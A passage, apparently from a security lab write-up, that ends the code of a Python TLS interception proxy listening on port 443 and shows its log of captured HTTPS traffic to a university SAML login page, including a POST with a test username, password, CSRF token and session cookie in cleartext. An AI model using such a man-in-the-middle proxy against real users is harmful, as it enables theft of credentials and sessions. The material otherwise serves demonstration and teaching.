sock.bind(('0.0.0.0', 443))
sock.listen(5)

while True:
    sock_for_browser, fromaddr = sock.accept()
    try:
        ssock_for_browser = context.wrap_socket(sock_for_browser, server_side=True)
        x = threading.Thread(target=process_request, args=(ssock_for_browser,))
        x.start()
        # print("TLS connection established")
        # data = ssock_for_browser.recv(1024)              # Read data over TLS
        # pprint.pprint("Request: {}".format(data))
        # ssock_for_browser.sendall(html.encode('utf-8'))  # Send data over TLS

        # ssock_for_browser.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
        # ssock_for_browser.close()

    except Exception:
        print("TLS connection fails")
        continue
```

  - Credentials (CTRL + F `j_username=testusername&j_password=testpassword`) - Output from `proxy.py`:

```
root@b43b6c7774cf:/volumes# python3 proxy.py 
Enter PEM pass phrase:
("Request: b'GET /idp/profile/SAML2/Redirect/SSO?execution=e8s2 "
'HTTP/1.1\\r\\nHost: wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux '
'x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\\r\\nAccept: '
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: '
'en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nReferer: '
'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s1\\r\\nDNT: '
'1\\r\\nConnection: keep-alive\\r\\nCookie: '
'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nUpgrade-Insecure-Requests: '
'1\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: '
'navigate\\r\\nSec-Fetch-Site: same-origin\\r\\nSec-Fetch-User: '
"?1\\r\\nCache-Control: max-age=0\\r\\n\\r\\n'")
("Request: b'GET /idp/images/logo_compete_final.png HTTP/1.1\\r\\nHost: "
'wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) '
'Gecko/20100101 Firefox/91.0\\r\\nAccept: '
'image/webp,*/*\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: '
'gzip, deflate, br\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nReferer: '
'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nCookie: '
'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nSec-Fetch-Dest: '
'image\\r\\nSec-Fetch-Mode: no-cors\\r\\nSec-Fetch-Site: '
'same-origin\\r\\nIf-Modified-Since: Thu, 05 May 2022 10:42:20 '
'GMT\\r\\nIf-None-Match: W/"4154-1651747340000"\\r\\nCache-Control: '
"max-age=0\\r\\n\\r\\n'")
("Request: b'GET /idp/images/logo_autenticacao_final.png HTTP/1.1\\r\\nHost: "
'wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) '
'Gecko/20100101 Firefox/91.0\\r\\nAccept: '
'image/webp,*/*\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: '
'gzip, deflate, br\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nReferer: '
'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nCookie: '
'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nSec-Fetch-Dest: '
'image\\r\\nSec-Fetch-Mode: no-cors\\r\\nSec-Fetch-Site: '
'same-origin\\r\\nIf-Modified-Since: Thu, 05 May 2022 10:42:20 '
'GMT\\r\\nIf-None-Match: W/"3559-1651747340000"\\r\\nCache-Control: '
"max-age=0\\r\\n\\r\\n'")
("Request: b'GET /idp/images/LogoAai.png HTTP/1.1\\r\\nHost: "
'wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) '
'Gecko/20100101 Firefox/91.0\\r\\nAccept: '
'image/webp,*/*\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: '
'gzip, deflate, br\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nCookie: '
'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nSec-Fetch-Dest: '
'image\\r\\nSec-Fetch-Mode: no-cors\\r\\nSec-Fetch-Site: '
"same-origin\\r\\n\\r\\n'")
("Request: b'POST /idp/profile/SAML2/Redirect/SSO?execution=e8s2 "
'HTTP/1.1\\r\\nHost: wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux '
'x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\\r\\nAccept: '
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: '
'en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nContent-Type: '
'application/x-www-form-urlencoded\\r\\nContent-Length: 118\\r\\nOrigin: '
'https://wayf.up.pt\\r\\nDNT: 1\\r\\nConnection: keep-alive\\r\\nReferer: '
'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nCookie: '
'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nUpgrade-Insecure-Requests: '
'1\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: '
'navigate\\r\\nSec-Fetch-Site: same-origin\\r\\nSec-Fetch-User: '
"?1\\r\\n\\r\\ncsrf_token=_feabaf136a0d1e77bce0fff4398886dec14bb199&j_username=testusername&j_password=testpassword&_eventId_proceed='")
("Request: b'GET /idp/profile/SAML2/Redirect/SSO?execution=e8s3 "
'HTTP/1.1\\r\\nHost: wayf.up.pt\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux '
'x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\\r\\nAccept: '
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: '
'en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nReferer: '
'https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e8s2\\r\\nDNT: '
'1\\r\\nConnection: keep-alive\\r\\nCookie: '
'JSESSIONID=DD5BAE7AA71CEEF8674D5B82689951B4\\r\\nUpgrade-Insecure-Requests: '
'1\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: '
'navigate\\r\\nSec-Fetch-Site: same-origin\\r\\nSec-Fetch-User: '
"?1\\r\\n\\r\\n'")
```